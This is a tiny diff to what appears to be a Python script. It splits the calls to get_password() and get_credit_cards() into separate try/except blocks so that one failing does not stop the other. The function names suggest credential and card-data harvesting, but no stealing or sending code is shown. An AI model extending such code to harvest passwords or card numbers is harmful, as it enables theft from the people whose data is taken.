@@ -227,6 +227,10 @@ def get_credit_cards():
 
 try:
     get_password()
+except:
+    continue
+
+try:
     get_credit_cards()
 except:
     continue
